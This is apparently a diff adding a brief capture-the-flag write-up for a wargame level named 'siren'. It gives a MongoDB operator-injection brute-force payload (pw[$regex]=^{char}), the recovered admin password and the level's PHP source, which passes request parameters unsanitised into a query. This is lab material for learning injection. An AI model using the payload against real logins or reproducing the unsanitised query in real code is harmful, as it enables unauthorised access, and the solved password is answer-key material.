@@ -1,0 +1,27 @@
+More info: PayloadsAllTheThings/NoSQL Injection
+
+brute payload: ?id=admin&pw[$regex]=^{char}
+
+query : {"id":"admin","pw":"1588f5a3"}
+Hello User
+SIREN Clear!
+http://www.wechall.net
+<?php
+  include "./config.php";
+  login_chk();
+  $db = mongodb_connect();
+  $query = array(
+    "id" => $_GET['id'],
+    "pw" => $_GET['pw']
+  );
+  echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
+  $result = mongodb_fetch_array($db->prob_siren->find($query));
+  if($result['id']) echo "<h2>Hello User</h2>";
+
+  $query = array("id" => "admin");
+  $result = mongodb_fetch_array($db->prob_siren->find($query));
+  if($result['pw'] === $_GET['pw']) solve("siren");
+  highlight_file(__FILE__);
+?>
+
+
